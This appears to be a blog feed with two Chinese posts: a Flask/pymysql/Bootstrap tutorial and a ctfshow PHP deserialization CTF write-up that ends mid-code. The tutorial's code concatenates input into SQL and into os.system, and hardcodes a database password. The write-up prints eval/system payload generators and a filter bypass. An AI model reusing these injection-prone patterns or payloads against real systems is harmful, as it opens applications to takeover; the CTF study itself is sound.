class="string">&#x27;localhost&#x27;</span>,user=<span class="string">&#x27;root&#x27;</span>,password=<span class="string">&#x27;intothedark&#x27;</span>,database=database)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"><span class="comment"># 使用 execute() 方法执行 SQL</span></span><br><span class="line">cursor.execute(<span class="string">&quot;show tables&quot;</span>)</span><br><span class="line"><span class="comment"># 把结果赋值给table_list</span></span><br><span class="line">table_list = [<span class="built_in">tuple</span>[<span class="number">0</span>] <span class="keyword">for</span> <span class="built_in">tuple</span> <span class="keyword">in</span> cursor.fetchall()]</span><br><span class="line">message = <span class="string">&quot;database_name is &quot;</span>+database + <span class="string">&quot;,there are &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(table_list)) + <span class="string">&quot; tables. their names are &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table_list:</span><br><span class="line">message = message +i + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"><span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">database,table,col,data,aim</span>):</span><br><span class="line"><span class="comment"># 调用数据库连接方法</span></span><br><span class="line">db = connect_sql(database)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"><span class="comment"># 使用 execute() 方法执行 SQL</span></span><br><span class="line">cursor.execute(<span class="string">&quot;select &quot;</span>+aim + <span class="string">&quot; from &quot;</span>+table+<span class="string">&quot; where &quot;</span>+col+<span class="string">&quot; = &quot;</span>+data)</span><br><span class="line">results = cursor.fetchall()</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> results:</span><br><span class="line">result = row[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="前端框架bootstrap举例"><a href="#前端框架bootstrap举例" class="headerlink" title="前端框架bootstrap举例"></a>前端框架bootstrap举例</h2><p>该项目主要以htlm、css、js为主，用于搭建简易前端项目，在此赘述的原因是用于演示前端框架的组件使用，个人体验下来该框架更加适合组件的应用。以下开始初步介绍小型项目的前端开发流程：</p><h3 id="安装bootstrap"><a href="#安装bootstrap" class="headerlink" title="安装bootstrap"></a>安装bootstrap</h3><p>bootstrap官方提供了cdn，可以直接引用</p><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 最新版本的 Bootstrap 核心 CSS 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 可选的 Bootstrap 主题文件（一般不用引入） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap-theme.min.css&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-6pzBo3FDv/PJ8r2KRkGHifhEocL+1X2rVCTTkUfGk7/0pbek5mMa1upzvWbrUbOZ&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="选定布局"><a href="#选定布局" class="headerlink" title="选定布局"></a>选定布局</h3><p>在开发页面之前首先要决定页面的布局，一般的前端框架会提供不同的容器格式，如bootstrap的：</p><p><code>.container</code> 类用于固定宽度并支持响应式布局的容器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>.container-fluid</code> 类用于 100% 宽度，占据全部视口（viewport）的容器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有这两种那么我们可以组合成以下样式的页面：</p><p><img src="/posts/35507/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-16730715179651.png" alt="1"></p><h3 id="填组件写脚本"><a href="#填组件写脚本" class="headerlink" title="填组件写脚本"></a>填组件写脚本</h3><p>这段内容不进行赘述，直接演示即可。该放按钮放按钮，该写脚本写脚本，该写路由写路由。</p><h2 id="将人工智能、前端、后端结合起来的项目演示"><a href="#将人工智能、前端、后端结合起来的项目演示" class="headerlink" title="将人工智能、前端、后端结合起来的项目演示"></a>将人工智能、前端、后端结合起来的项目演示</h2><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p><code>conda create --name py38 python=3.8</code></p><p><code>pip install -r requirements.txt</code></p><p>下载yolov5预训练模型放至根目录下</p><h3 id="模型测试"><a href="#模型测试" class="headerlink" title="模型测试"></a>模型测试</h3><p><code>python detect.py --source ./data/images/bus.jpg</code></p><p><img src="/posts/35507/bus.jpg" alt="bus"></p><p>可以看到成功输出了图片</p><h3 id="使用flask调用模型（os直接简单粗暴的调用"><a href="#使用flask调用模型（os直接简单粗暴的调用" class="headerlink" title="使用flask调用模型（os直接简单粗暴的调用"></a>使用flask调用模型（<del>os直接简单粗暴的调用</del></h3><p>修改模型的图片保存地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#将67行改为</span><br><span class="line">save_dir = Path(project) / name #increment_path(Path(project) / name, exist_ok=exist_ok)  # increment run</span><br><span class="line">#将86行改为</span><br><span class="line">parser.add_argument(&#x27;--project&#x27;, default=ROOT / &#x27;../flask/static&#x27;, help=&#x27;save results to project/name&#x27;)</span><br></pre></td></tr></table></figure><p>flask的文件处理部分改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">   f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">   <span class="built_in">print</span>(request.files)</span><br><span class="line">   f.save(<span class="string">&quot;./upload/&quot;</span>+f.filename)</span><br><span class="line">   os.system(<span class="string">&quot;python ../yolov5-master/detect.py --source ./upload/&quot;</span>+f.filename)</span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,Imgsrc=<span class="string">&#x27;./result/&#x27;</span>+f.filename)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> development </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow反序列化</title>
      <link href="/posts/23601/"/>
      <url>/posts/23601/</url>
      
        <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p><code>?username=xxxxxx&amp;password=xxxxxx</code></p><p>最简单的读读码</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    <span class="comment">//接受了一个序列化对象</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;    <span class="comment">//对其属性进行操作</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">      <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到$user是反序列化了一个用户在Cookie输入的序列化后的类，因为原来的类是public的，所以选择直接构造符合条件的属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;<span class="comment">//有无均可</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;<span class="comment">//有无均可</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>payload:O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);  </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">      <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次要求username!&#x3D;&#x3D;passord，用上次的payload显然不行。但是要知道，我们可以直接控制我们输入的类，可以与代码中定义的不同。因此我们直接定义用户名和密码不同的类，再传参：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?username=aaa&amp;password=xxxxxx</code></p><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line"><span class="class">  <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//无用类</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//我们要利用的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">  <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要利用后门类，就可以通过更改public方法来直接使得在构造类的时候就直接将$this-&gt;class定义为后门类，这样就可以再设定后门类，将定义好的后门类也直接序列化。</p><p>下面是payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;highlight_file(&#x27;flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?username=aaa&amp;password=xxxxxx</code></p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>需要绕过O:数字 或者 C:数字 的正则匹配，用+绕过</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;C:&#x27;</span>,<span class="string">&#x27;C:+&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><del>理论可行，但是在buu的环境下并未尝试成功</del></p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>给了flag.php中的一节源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.php中只有短短的两行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p>而且我们并不知道任何的类方法，我们在这里复习一下魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct() //对象被创建时触发</span><br></pre></td></tr></table></figure><p>因此在调用对象中不可访问的方法时，会调用__call方法。</p><p>例如我们在本地监听9999端口，构造一个不存在的方法然后访问9999端口便会有如下的监听结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:9999/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1:9999/flag&quot;</span>,<span 